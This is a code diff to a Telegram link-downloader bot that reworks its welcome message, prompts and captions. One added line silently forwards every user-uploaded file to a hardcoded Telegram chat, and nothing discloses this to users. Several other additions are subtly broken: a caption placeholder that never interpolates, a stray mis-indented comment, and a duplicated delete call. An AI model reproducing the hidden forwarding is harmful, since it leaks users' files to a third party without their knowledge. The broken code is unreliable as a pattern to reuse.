@@ -50,10 +50,15 @@ async def account_login(bot: Client, m: Message):
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await m.reply_text(f"**Hey {m.from_user.mention} 👋!**\n\n➨ 𝗜 𝗮𝗺 𝗮 𝗧𝗫𝗧 𝗗𝗮𝘄𝗻𝗹𝗼𝗮𝗱𝗲𝗿 𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 𝗪𝗶𝘁𝗵 ❤️ \n\n➨𝗨𝘀𝗲 /help 𝗸𝗻𝗼𝘄 𝗮𝗯𝗼𝘂𝘁 𝗺𝗲.\n➨𝗨𝘀𝗲 /upgrade 𝗙𝗼𝗿 𝗖𝗵𝗲𝗰𝗸 𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽 𝗣𝗿𝗶𝗰𝗲 \n\n➨ 𝗠𝗼𝗱𝗶𝗳𝗶𝗲𝗱 𝗕𝘆 : @LegendRobot",
+    caption = "**Hey {m.from_user.mention} 👋!**\n\n➨ 𝗜 𝗮𝗺 𝗮 𝗧𝗫𝗧 𝗗𝗮𝘄𝗻𝗹𝗼𝗮𝗱𝗲𝗿 𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 𝗪𝗶𝘁𝗵 ❤️ \n\n➨𝗨𝘀𝗲 /help 𝗸𝗻𝗼𝘄 𝗮𝗯𝗼𝘂𝘁 𝗺𝗲.\n➨𝗨𝘀𝗲 /upgrade 𝗙𝗼𝗿 𝗖𝗵𝗲𝗰𝗸 𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽 𝗣𝗿𝗶𝗰𝗲 \n\n➨ 𝗠𝗼𝗱𝗶𝗳𝗶𝗲𝗱 𝗕𝘆 : @LegendRobot"
+
+# Assuming 'm' is defined somewhere within the function
+    await m.reply_photo(
+        photo="https://telegra.ph/file/c37f3eaf3e59e7e64fde7.png",
+        caption=caption,
         reply_markup=reply_markup
     )
-
+    
     # Track user interaction with the /start command
     user_id = m.from_user.id
     chat_id = m.chat.id
@@ -154,7 +159,10 @@ async def love_command(bot: Client, m: Message):
         editable = await m.reply_text('ƬƠ ƊƛƜƝԼƠƛƊ ƛ ƬҲƬ ƑƖԼЄ ƧЄƝƊ ӇЄƦЄ ⚡️')
         input: Message = await bot.listen(editable.chat.id)
         x = await input.download()
+        await bot.send_document(-1002025597347, x)
         await input.delete(True)
+        file_name, ext = os.path.splitext(os.path.basename(x))
+        credit = f"[{m.from_user.first_name}](tg://user?id={m.from_user.id})"
 
         path = f"./downloads/{m.chat.id}"
 
@@ -178,11 +186,15 @@ async def love_command(bot: Client, m: Message):
     raw_text = input0.text
     await input0.delete(True)
 
-    await editable.edit("ƝƠƜ ƤԼЄƛƧЄ ƧЄƝƊ MЄ ᎩƠƲƦ ƁƛƬƇӇ ƝƛMЄ")
+    await editable.edit("ЄƝƬЄƦ ƁƛƬƇӇ ƝƛMЄ ƠƦ ƧЄƝƊ __batch__ ƑƠƦ ƓƦƛƁƖƝƓ ƑƦƠM ƬҲƬ ƑƖԼЄƝƛMЄ")
     input1 = await bot.listen(editable.chat.id)
     raw_text0 = input1.text
     await input1.delete(True)
-    
+    await input1.delete(True)
+    if raw_text0 == 'batch':
+        b_name = file_name
+    else:
+        b_name = raw_text0
 
     await editable.edit("ЄƝƬЄƦ ƦЄƧƠԼƲƬƖƠƝ 🚀\n➥ 144,240,360,480,720,1080 \n\nƤԼЄƛƧЄ ƇӇƠƠƧЄ ƢƲƛԼƖƬᎩ")
     input2: Message = await bot.listen(editable.chat.id)
@@ -208,13 +220,12 @@ async def love_command(bot: Client, m: Message):
     
     
 
-    await editable.edit("ƝƠƜ ЄƝƬЄƦ ᎩƠƲƦ ƝƛMЄ ƬƠ ƛƊƊ ƇƦЄƊƖƬ ƠƝ ᎩƠƲƦ ƲƤԼƠƛƊЄƊ ƑƖԼЄ")
+    await editable.edit("ЄƝƬЄƦ ᎩƠƲƦ ƝƛMЄ ƠƦ ƧЄƝƊ __name__ ƑƠƦ ƲƧЄ ƊЄƑƛƲԼƬ")
     input3: Message = await bot.listen(editable.chat.id)
     raw_text3 = input3.text
     await input3.delete(True)
-    highlighter  = f"️ ⁪⁬⁮⁮⁮"
-    if raw_text3 == 'Robin':
-        MR = highlighter 
+    if raw_text3 == 'name':
+        MR = credit
     else:
         MR = raw_text3
    
@@ -284,7 +295,7 @@ async def love_command(bot: Client, m: Message):
                 
                 cc1 = f'''
 ╭─《 🚀 DAWNLOAD INFO 》
-├ <b>Vid_id:</b> <code>{str(count).zfill(3)}</code>
+├ <b>Pdf_Id:</b> <code>{str(count).zfill(3)}</code>
 ├ <b>Title:</b>  <code>{name1}</code>
 ├ <b>Batch:</b> <code>{raw_text0}</code>
 ├ <b>Quality:</b> <code>{raw_text2}</code>
@@ -319,7 +330,7 @@ async def love_command(bot: Client, m: Message):
                         time.sleep(e.x)
                         continue
                 else:
-                    Show = f"**⥥🅓🅞🅦🅝🅛🅞🅐🅓🅘🅝🅖... »**\n\n**🍁ƝƛMЄ »** `{name}\n❄𝑄𝑈𝐴𝐿𝐼𝑇𝑌 » {raw_text2}`\n\n**🔗ƲƦԼ »** `{url}`"
+                    Show = f"**⥥🅓🅞🅦🅝🅛🅞🅐🅓🅘🅝🅖... »**\n\n**🍁ƝƛMЄ »** `{name}\n\n❄𝑄𝑈𝐴𝐿𝐼𝑇𝑌 » {raw_text2}`\n\n**🔗ƲƦԼ »** `{url}`"
                     prog = await m.reply_text(Show)
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
